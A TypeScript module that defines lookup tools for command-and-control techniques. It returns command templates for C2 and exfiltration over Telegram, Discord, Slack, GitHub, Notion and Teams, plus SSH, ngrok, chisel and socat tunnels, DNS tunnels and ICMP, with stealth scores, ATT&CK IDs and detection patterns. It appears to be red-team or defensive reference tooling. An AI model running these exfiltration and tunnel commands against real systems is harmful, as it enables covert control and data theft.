import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform, UnifiedLOLEntry } from "../schema/unified-entry.js";

// ━━━ Hardcoded C2 Technique Data ━━━

interface C2Technique {
  name: string;
  description: string;
  commandTemplate: string;
  detectionPatterns: string[];
  stealthScore: number;
  requiredBinaries: string[];
  platforms: Platform[];
  attck: string[];
}

const LOLC2_SERVICES: Record<string, C2Technique[]> = {
  telegram: [
    {
      name: "Telegram Bot C2",
      description: "Use Telegram Bot API as a C2 channel via HTTPS polling",
      commandTemplate: 'curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates" | python3 -c "import sys,json; print(json.load(sys.stdin))"',
      detectionPatterns: ["api.telegram.org", "DNS query to telegram", "Outbound HTTPS to 149.154.0.0/16"],
      stealthScore: 2,
      requiredBinaries: ["curl", "python3"],
      platforms: ["linux", "macos", "windows"],
      attck: ["T1071.001", "T1102.002"],
    },
  ],
  discord: [
    {
      name: "Discord Webhook C2",
      description: "Use Discord webhooks for command dispatch and exfiltration",
      commandTemplate: 'curl -X POST -H "Content-Type: application/json" -d \'{"content":"<CMD_OUTPUT>"}\' https://discord.com/api/webhooks/<ID>/<TOKEN>',
      detectionPatterns: ["discord.com/api/webhooks", "DNS query to discord.com", "Outbound HTTPS to Discord CDN"],
      stealthScore: 2,
      requiredBinaries: ["curl"],
      platforms: ["linux", "macos", "windows"],
      attck: ["T1071.001", "T1102.002"],
    },
  ],
  slack: [
    {
      name: "Slack API C2",
      description: "Use Slack API and bot tokens for bidirectional C2 communication",
      commandTemplate: 'curl -s -H "Authorization: Bearer <TOKEN>" https://slack.com/api/chat.postMessage -d "channel=<CHANNEL>&text=<CMD_OUTPUT>"',
      detectionPatterns: ["slack.com/api", "DNS query to slack.com", "Bearer token in HTTP header"],
      stealthScore: 2,
      requiredBinaries: ["curl"],
      platforms: ["linux", "macos", "windows"],
      attck: ["T1071.001", "T1102.002"],
    },
  ],
  github: [
    {
      name: "GitHub Gist C2",
      description: "Use GitHub Gists as dead-drop C2 storage for commands and results",
      commandTemplate: 'curl -s -H "Authorization: token <PAT>" https://api.github.com/gists/<GIST_ID> | python3 -c "import sys,json; print(json.load(sys.stdin)[\'files\'][\'cmd.txt\'][\'content\'])"',
      detectionPatterns: ["api.github.com/gists", "GitHub API token usage", "Periodic HTTPS polling to GitHub"],
      stealthScore: 1,
      requiredBinaries: ["curl", "python3"],
      platforms: ["linux", "macos", "windows"],
      attck: ["T1071.001", "T1102.002"],
    },
    {
      name: "GitHub Issue C2",
      description: "Use GitHub issue comments as C2 command channel",
      commandTemplate: 'curl -s -H "Authorization: token <PAT>" https://api.github.com/repos/<OWNER>/<REPO>/issues/<NUM>/comments',
      detectionPatterns: ["api.github.com/repos", "Periodic HTTPS polling to GitHub"],
      stealthScore: 1,
      requiredBinaries: ["curl"],
      platforms: ["linux", "macos", "windows"],
      attck: ["T1071.001", "T1102.002"],
    },
  ],
  notion: [
    {
      name: "Notion API C2",
      description: "Use Notion API pages/databases as C2 dead-drop channels",
      commandTemplate: 'curl -s -X PATCH "https://api.notion.com/v1/pages/<PAGE_ID>" -H "Authorization: Bearer <TOKEN>" -H "Notion-Version: 2022-06-28" -H "Content-Type: application/json" -d \'{"properties":{}}\'',
      detectionPatterns: ["api.notion.com", "DNS query to notion.com", "Notion-Version header"],
      stealthScore: 1,
      requiredBinaries: ["curl"],
      platforms: ["linux", "macos", "windows"],
      attck: ["T1071.001", "T1102.002"],
    },
  ],
};

const LOTS_DOMAINS: Array<{ domain: string; service: string; usage: string; stealthScore: number }> = [
  { domain: "pastebin.com", service: "Pastebin", usage: "Dead-drop for commands/payloads", stealthScore: 3 },
  { domain: "raw.githubusercontent.com", service: "GitHub Raw", usage: "Host payloads as raw files", stealthScore: 1 },
  { domain: "docs.google.com", service: "Google Docs", usage: "C2 via shared document content", stealthScore: 1 },
  { domain: "drive.google.com", service: "Google Drive", usage: "File staging and exfiltration", stealthScore: 1 },
  { domain: "onedrive.live.com", service: "OneDrive", usage: "File staging and exfiltration", stealthScore: 1 },
  { domain: "dropbox.com", service: "Dropbox", usage: "File staging and C2 via API", stealthScore: 1 },
  { domain: "s3.amazonaws.com", service: "AWS S3", usage: "Payload hosting and data exfil", stealthScore: 1 },
  { domain: "storage.googleapis.com", service: "GCS", usage: "Payload hosting and data exfil", stealthScore: 1 },
  { domain: "azurewebsites.net", service: "Azure Web Apps", usage: "C2 redirector hosting", stealthScore: 1 },
  { domain: "cdn.jsdelivr.net", service: "jsDelivr CDN", usage: "Payload hosting via npm/GitHub", stealthScore: 1 },
  { domain: "ngrok.io", service: "ngrok", usage: "Tunnel-based C2 redirector", stealthScore: 3 },
  { domain: "trycloudflare.com", service: "Cloudflare Tunnel", usage: "Quick tunnel C2 redirector", stealthScore: 2 },
  { domain: "transfer.sh", service: "transfer.sh", usage: "Temporary file hosting for payloads", stealthScore: 3 },
  { domain: "paste.ee", service: "paste.ee", usage: "Dead-drop for commands", stealthScore: 3 },
  { domain: "hastebin.com", service: "Hastebin", usage: "Dead-drop for commands", stealthScore: 3 },
];

const TUNNEL_TECHNIQUES: C2Technique[] = [
  {
    name: "SSH Remote Port Forward",
    description: "Reverse SSH tunnel to expose internal service via remote port forward",
    commandTemplate: "ssh -R <REMOTE_PORT>:127.0.0.1:<LOCAL_PORT> user@<C2_SERVER> -fN",
    detectionPatterns: ["Outbound SSH on port 22", "ssh -R flag", "Long-lived SSH sessions"],
    stealthScore: 2,
    requiredBinaries: ["ssh"],
    platforms: ["linux", "macos"],
    attck: ["T1572", "T1071.004"],
  },
  {
    name: "SSH Dynamic SOCKS Proxy",
    description: "Create a SOCKS5 proxy via SSH dynamic port forwarding for C2 tunneling",
    commandTemplate: "ssh -D <SOCKS_PORT> user@<C2_SERVER> -fN",
    detectionPatterns: ["Outbound SSH", "ssh -D flag", "SOCKS proxy traffic patterns"],
    stealthScore: 2,
    requiredBinaries: ["ssh"],
    platforms: ["linux", "macos"],
    attck: ["T1572", "T1090.001"],
  },
  {
    name: "ngrok TCP Tunnel",
    description: "Use ngrok to expose a local listener through a public endpoint for C2",
    commandTemplate: "ngrok tcp <LOCAL_PORT>",
    detectionPatterns: ["ngrok process", "DNS to ngrok.io/ngrok-free.app", "tunnel.us.ngrok.com connections"],
    stealthScore: 4,
    requiredBinaries: ["ngrok"],
    platforms: ["linux", "macos", "windows"],
    attck: ["T1572", "T1090.002"],
  },
  {
    name: "Chisel Reverse Tunnel",
    description: "Use Chisel to create a reverse tunnel over HTTP for C2 communication",
    commandTemplate: "chisel client <C2_SERVER>:<PORT> R:<REMOTE_PORT>:127.0.0.1:<LOCAL_PORT>",
    detectionPatterns: ["chisel process", "HTTP upgrade to websocket", "Go binary execution"],
    stealthScore: 3,
    requiredBinaries: ["chisel"],
    platforms: ["linux", "macos", "windows"],
    attck: ["T1572", "T1090.002"],
  },
  {
    name: "Socat Relay",
    description: "Use socat to relay traffic between local and remote C2 endpoint",
    commandTemplate: "socat TCP-LISTEN:<LOCAL_PORT>,reuseaddr,fork TCP:<C2_SERVER>:<REMOTE_PORT>",
    detectionPatterns: ["socat process", "Dual TCP connections", "Port forwarding behavior"],
    stealthScore: 3,
    requiredBinaries: ["socat"],
    platforms: ["linux", "macos"],
    attck: ["T1572", "T1090"],
  },
];

const WEBHOOK_TECHNIQUES: C2Technique[] = [
  {
    name: "Slack Incoming Webhook C2",
    description: "Use Slack incoming webhook to exfiltrate data and receive commands via channel monitoring",
    commandTemplate: 'curl -X POST -H "Content-type: application/json" -d \'{"text":"<OUTPUT>"}\' https://hooks.slack.com/services/<T>/<B>/<TOKEN>',
    detectionPatterns: ["hooks.slack.com", "Outbound HTTPS to Slack", "JSON POST with text field"],
    stealthScore: 2,
    requiredBinaries: ["curl"],
    platforms: ["linux", "macos", "windows"],
    attck: ["T1071.001", "T1102.002"],
  },
  {
    name: "Discord Webhook Exfil",
    description: "Use Discord webhook to exfiltrate command output as messages or file attachments",
    commandTemplate: 'curl -F "file=@<FILE>" https://discord.com/api/webhooks/<ID>/<TOKEN>',
    detectionPatterns: ["discord.com/api/webhooks", "Multipart form upload to Discord", "Outbound HTTPS to Discord"],
    stealthScore: 2,
    requiredBinaries: ["curl"],
    platforms: ["linux", "macos", "windows"],
    attck: ["T1071.001", "T1102.002", "T1567.001"],
  },
  {
    name: "Microsoft Teams Webhook C2",
    description: "Use Microsoft Teams incoming webhook connector for C2 communication",
    commandTemplate: 'curl -H "Content-Type: application/json" -d \'{"text":"<OUTPUT>"}\' https://<TENANT>.webhook.office.com/webhookb2/<PATH>',
    detectionPatterns: ["webhook.office.com", "Outbound HTTPS to Microsoft", "Teams connector URL pattern"],
    stealthScore: 1,
    requiredBinaries: ["curl"],
    platforms: ["linux", "macos", "windows"],
    attck: ["T1071.001", "T1102.002"],
  },
];

const DNS_TECHNIQUES: C2Technique[] = [
  {
    name: "dnscat2 DNS Tunnel",
    description: "Full-featured DNS tunnel using TXT/CNAME/MX records for bidirectional C2",
    commandTemplate: "dnscat2 <C2_DOMAIN>",
    detectionPatterns: ["High volume DNS TXT queries", "Long DNS subdomain labels", "dnscat2 process", "Unusual DNS query frequency"],
    stealthScore: 2,
    requiredBinaries: ["dnscat2"],
    platforms: ["linux", "macos"],
    attck: ["T1071.004", "T1572"],
  },
  {
    name: "iodine DNS Tunnel",
    description: "IP-over-DNS tunnel using NULL/TXT/CNAME records for network tunneling",
    commandTemplate: "iodine -f <C2_DNS_SERVER> <TUNNEL_DOMAIN>",
    detectionPatterns: ["iodine process", "High volume DNS NULL queries", "IP-over-DNS traffic patterns", "Large DNS responses"],
    stealthScore: 2,
    requiredBinaries: ["iodine"],
    platforms: ["linux", "macos"],
    attck: ["T1071.004", "T1572"],
  },
  {
    name: "dns2tcp DNS Tunnel",
    description: "TCP-over-DNS tunnel for encapsulating TCP connections within DNS queries",
    commandTemplate: "dns2tcpc -z <DOMAIN> -r ssh <DNS_SERVER>",
    detectionPatterns: ["dns2tcpc process", "Sustained DNS TXT queries to single domain", "Encoded subdomain labels"],
    stealthScore: 2,
    requiredBinaries: ["dns2tcpc"],
    platforms: ["linux"],
    attck: ["T1071.004", "T1572"],
  },
];

const PROTOCOL_ABUSE_TECHNIQUES: C2Technique[] = [
  {
    name: "ICMP Tunnel C2",
    description: "Encode C2 data within ICMP echo request/reply payload bytes",
    commandTemplate: "ping -p <HEX_PAYLOAD> -c 1 <C2_SERVER>",
    detectionPatterns: ["Unusual ICMP payload sizes", "High-frequency ICMP traffic", "Non-standard ICMP data content", "ping with -p flag"],
    stealthScore: 2,
    requiredBinaries: ["ping"],
    platforms: ["linux", "macos"],
    attck: ["T1095", "T1572"],
  },
  {
    name: "DNS TXT Record C2",
    description: "Exfiltrate data and receive commands via DNS TXT record queries",
    commandTemplate: "dig TXT <ENCODED_DATA>.<C2_DOMAIN> +short",
    detectionPatterns: ["DNS TXT queries with encoded subdomains", "Base64-like DNS labels", "High DNS query volume to single domain"],
    stealthScore: 2,
    requiredBinaries: ["dig", "nslookup"],
    platforms: ["linux", "macos", "windows"],
    attck: ["T1071.004", "T1048.001"],
  },
  {
    name: "HTTP Header C2",
    description: "Embed C2 commands and data in HTTP headers (Cookie, X-Forwarded-For, User-Agent)",
    commandTemplate: 'curl -H "X-Command: <BASE64_CMD>" -H "Cookie: session=<ENCODED_DATA>" https://<C2_SERVER>/page',
    detectionPatterns: ["Unusual HTTP header values", "Base64 in Cookie/UA headers", "Periodic HTTP requests with custom headers"],
    stealthScore: 1,
    requiredBinaries: ["curl", "wget"],
    platforms: ["linux", "macos", "windows"],
    attck: ["T1071.001", "T1001.002"],
  },
  {
    name: "HTTPS POST Body C2",
    description: "Disguise C2 traffic as normal HTTPS POST form submissions",
    commandTemplate: 'curl -X POST -d "q=<ENCODED_CMD>" https://<C2_DOMAIN>/search',
    detectionPatterns: ["Periodic HTTPS POST to same endpoint", "Encoded form data", "Unusual POST body patterns"],
    stealthScore: 1,
    requiredBinaries: ["curl"],
    platforms: ["linux", "macos", "windows"],
    attck: ["T1071.001", "T1001"],
  },
];

// ━━━ Helper Functions ━━━

function findKBEntries(
  ctx: ToolContext,
  keywords: string[],
  platform?: Platform,
): UnifiedLOLEntry[] {
  const results: UnifiedLOLEntry[] = [];
  const seen = new Set<string>();

  // Search by C2 function
  const c2Entries = ctx.knowledgeBase.searchByFunction("c2", platform);
  for (const e of c2Entries) {
    if (!seen.has(e.id)) { seen.add(e.id); results.push(e); }
  }

  // Search by keywords
  for (const kw of keywords) {
    const kwEntries = ctx.knowledgeBase.searchByKeyword(kw, platform);
    for (const e of kwEntries) {
      if (!seen.has(e.id)) { seen.add(e.id); results.push(e); }
    }
  }

  return results;
}

function summarizeEntry(e: UnifiedLOLEntry): Record<string, unknown> {
  return {
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealthScore: e.stealthScore,
    commands: e.executionContexts.slice(0, 3).map(c => ({
      context: c.context,
      command: c.command,
      result: c.result,
    })),
    attck: e.attckTechniques,
    detection: {
      edrCoverage: e.detection.edrCoverage,
      sigmaRules: e.detection.sigmaRules.length,
      logSources: e.detection.logSources,
    },
  };
}

// ━━━ Tools ━━━

const c2_lolc2_lookup: ToolDef = {
  name: "c2_lolc2_lookup",
  description: "Look up C2 services from LOLC2 catalog data (telegram, discord, slack, github, notion)",
  schema: {
    service: z.enum(["telegram", "discord", "slack", "github", "notion"]).describe("C2 service platform to look up"),
    platform: z.string().optional().describe("Filter KB results by target platform (linux, windows, macos)"),
  },
  async execute(args: { service: string; platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    const techniques = LOLC2_SERVICES[args.service];
    if (!techniques) return text(`Unknown C2 service: "${args.service}". Valid: telegram, discord, slack, github, notion.`);

    const kbEntries = findKBEntries(ctx, [args.service, "c2", "webhook"], args.platform as Platform);

    // Also check LOLC2 catalog entries
    const lolc2Entries = ctx.knowledgeBase.searchByCatalog("lolc2")
      .filter(e => e.description.toLowerCase().includes(args.service) || e.binary.toLowerCase().includes(args.service));

    const allKBEntries = [...kbEntries];
    const seen = new Set(allKBEntries.map(e => e.id));
    for (const e of lolc2Entries) {
      if (!seen.has(e.id)) { seen.add(e.id); allKBEntries.push(e); }
    }

    return json({
      service: args.service,
      techniques: techniques.map(t => ({
        name: t.name,
        description: t.description,
        commandTemplate: t.commandTemplate,
        detectionPatterns: t.detectionPatterns,
        stealthScore: t.stealthScore,
        requiredBinaries: t.requiredBinaries,
        platforms: t.platforms,
        attck: t.attck,
      })),
      knowledgeBaseMatches: allKBEntries.slice(0, 15).map(summarizeEntry),
      totalKBMatches: allKBEntries.length,
    });
  },
};

const c2_lots_lookup: ToolDef = {
  name: "c2_lots_lookup",
  description: "Look up Living Off Trusted Sites domains for C2 communication and data staging",
  schema: {
    keyword: z.string().optional().describe("Filter domains by keyword (e.g. 'google', 'cdn', 'cloud')"),
    max_stealth: z.number().min(1).max(5).optional().describe("Maximum stealth score filter (1=stealthiest, 5=loudest)"),
    platform: z.string().optional().describe("Filter KB results by platform"),
  },
  async execute(args: { keyword?: string; max_stealth?: number; platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    let domains = [...LOTS_DOMAINS];

    if (args.keyword) {
      const kw = args.keyword.toLowerCase();
      domains = domains.filter(d =>
        d.domain.toLowerCase().includes(kw) ||
        d.service.toLowerCase().includes(kw) ||
        d.usage.toLowerCase().includes(kw),
      );
    }

    if (args.max_stealth !== undefined) {
      domains = domains.filter(d => d.stealthScore <= args.max_stealth!);
    }

    // Search KB for LOTS catalog and related entries
    const lotsEntries = ctx.knowledgeBase.searchByCatalog("lots");
    const downloadEntries = ctx.knowledgeBase.searchByFunction("download", args.platform as Platform);
    const uploadEntries = ctx.knowledgeBase.searchByFunction("upload", args.platform as Platform);

    const transferBinaries = [...downloadEntries, ...uploadEntries];
    const seen = new Set<string>();
    const uniqueTransfer = transferBinaries.filter(e => {
      if (seen.has(e.id)) return false;
      seen.add(e.id);
      return true;
    });

    return json({
      totalDomains: domains.length,
      domains,
      lotsKBEntries: lotsEntries.slice(0, 10).map(summarizeEntry),
      transferBinaries: uniqueTransfer.slice(0, 10).map(e => ({
        binary: e.binary,
        platform: e.platform,
        functions: e.functions,
        stealthScore: e.stealthScore,
      })),
      totalTransferBinaries: uniqueTransfer.length,
    });
  },
};

const c2_tunnel_lookup: ToolDef = {
  name: "c2_tunnel_lookup",
  description: "Find tunnel-based C2 techniques (SSH tunnels, ngrok, chisel, socat)",
  schema: {
    tunnel_type: z.enum(["ssh", "ngrok", "chisel", "socat", "all"]).optional().default("all")
      .describe("Specific tunnel type to look up, or 'all' for all tunnel techniques"),
    platform: z.string().optional().describe("Filter by target platform"),
  },
  async execute(args: { tunnel_type?: string; platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    const tunnelType = args.tunnel_type || "all";
    let techniques = [...TUNNEL_TECHNIQUES];

    if (tunnelType !== "all") {
      techniques = techniques.filter(t =>
        t.name.toLowerCase().includes(tunnelType) ||
        t.requiredBinaries.some(b => b.toLowerCase().includes(tunnelType)),
      );
    }

    if (args.platform) {
      techniques = techniques.filter(t => t.platforms.includes(args.platform as Platform));
    }

    // Search KB for tunnel-related binaries
    const tunnelKeywords = ["ssh", "ngrok", "chisel", "socat", "tunnel", "forward", "proxy"];
    const kbEntries = findKBEntries(ctx, tunnelKeywords, args.platform as Platform);

    return json({
      tunnelType,
      totalTechniques: techniques.length,
      techniques: techniques.map(t => ({
        name: t.name,
        description: t.description,
        commandTemplate: t.commandTemplate,
        detectionPatterns: t.detectionPatterns,
        stealthScore: t.stealthScore,
        requiredBinaries: t.requiredBinaries,
        platforms: t.platforms,
        attck: t.attck,
      })),
      knowledgeBaseMatches: kbEntries.slice(0, 10).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

const c2_webhook: ToolDef = {
  name: "c2_webhook",
  description: "Webhook-based C2 techniques (Slack webhooks, Discord webhooks, Teams connectors)",
  schema: {
    service: z.enum(["slack", "discord", "teams", "all"]).optional().default("all")
      .describe("Webhook service to look up, or 'all' for all webhook C2 techniques"),
    platform: z.string().optional().describe("Filter by target platform"),
  },
  async execute(args: { service?: string; platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    const service = args.service || "all";
    let techniques = [...WEBHOOK_TECHNIQUES];

    if (service !== "all") {
      techniques = techniques.filter(t =>
        t.name.toLowerCase().includes(service),
      );
    }

    if (args.platform) {
      techniques = techniques.filter(t => t.platforms.includes(args.platform as Platform));
    }

    // Search KB for webhook and HTTP-related entries
    const kbEntries = findKBEntries(ctx, ["webhook", "curl", "http", "post"], args.platform as Platform);

    return json({
      service,
      totalTechniques: techniques.length,
      techniques: techniques.map(t => ({
        name: t.name,
        description: t.description,
        commandTemplate: t.commandTemplate,
        detectionPatterns: t.detectionPatterns,
        stealthScore: t.stealthScore,
        requiredBinaries: t.requiredBinaries,
        platforms: t.platforms,
        attck: t.attck,
      })),
      knowledgeBaseMatches: kbEntries.slice(0, 10).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

const c2_dns: ToolDef = {
  name: "c2_dns",
  description: "DNS-based C2 techniques (dnscat2, iodine, dns2tcp)",
  schema: {
    tool: z.enum(["dnscat2", "iodine", "dns2tcp", "all"]).optional().default("all")
      .describe("Specific DNS tunnel tool to look up, or 'all'"),
    platform: z.string().optional().describe("Filter by target platform"),
  },
  async execute(args: { tool?: string; platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    const tool = args.tool || "all";
    let techniques = [...DNS_TECHNIQUES];

    if (tool !== "all") {
      techniques = techniques.filter(t =>
        t.name.toLowerCase().includes(tool) ||
        t.requiredBinaries.some(b => b.toLowerCase().includes(tool)),
      );
    }

    if (args.platform) {
      techniques = techniques.filter(t => t.platforms.includes(args.platform as Platform));
    }

    // Search KB for DNS-related entries
    const kbEntries = findKBEntries(ctx, ["dns", "dig", "nslookup", "resolve"], args.platform as Platform);

    return json({
      tool,
      totalTechniques: techniques.length,
      techniques: techniques.map(t => ({
        name: t.name,
        description: t.description,
        commandTemplate: t.commandTemplate,
        detectionPatterns: t.detectionPatterns,
        stealthScore: t.stealthScore,
        requiredBinaries: t.requiredBinaries,
        platforms: t.platforms,
        attck: t.attck,
      })),
      knowledgeBaseMatches: kbEntries.slice(0, 10).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

const c2_protocol_abuse: ToolDef = {
  name: "c2_protocol_abuse",
  description: "Protocol abuse for C2 communication (ICMP tunneling, DNS TXT, HTTP header embedding)",
  schema: {
    protocol: z.enum(["icmp", "dns_txt", "http_header", "all"]).optional().default("all")
      .describe("Protocol abuse technique to look up, or 'all'"),
    platform: z.string().optional().describe("Filter by target platform"),
  },
  async execute(args: { protocol?: string; platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    const protocol = args.protocol || "all";
    let techniques = [...PROTOCOL_ABUSE_TECHNIQUES];

    if (protocol !== "all") {
      const protocolMap: Record<string, string> = {
        icmp: "icmp",
        dns_txt: "dns txt",
        http_header: "http header",
      };
      const searchTerm = protocolMap[protocol] || protocol;
      techniques = techniques.filter(t =>
        t.name.toLowerCase().includes(searchTerm),
      );
    }

    if (args.platform) {
      techniques = techniques.filter(t => t.platforms.includes(args.platform as Platform));
    }

    // Search KB for protocol-related entries
    const keywords = ["ping", "icmp", "dns", "dig", "curl", "wget", "http"];
    const kbEntries = findKBEntries(ctx, keywords, args.platform as Platform);

    return json({
      protocol,
      totalTechniques: techniques.length,
      techniques: techniques.map(t => ({
        name: t.name,
        description: t.description,
        commandTemplate: t.commandTemplate,
        detectionPatterns: t.detectionPatterns,
        stealthScore: t.stealthScore,
        requiredBinaries: t.requiredBinaries,
        platforms: t.platforms,
        attck: t.attck,
      })),
      knowledgeBaseMatches: kbEntries.slice(0, 10).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

export const c2Tools: ToolDef[] = [
  c2_lolc2_lookup,
  c2_lots_lookup,
  c2_tunnel_lookup,
  c2_webhook,
  c2_dns,
  c2_protocol_abuse,
];
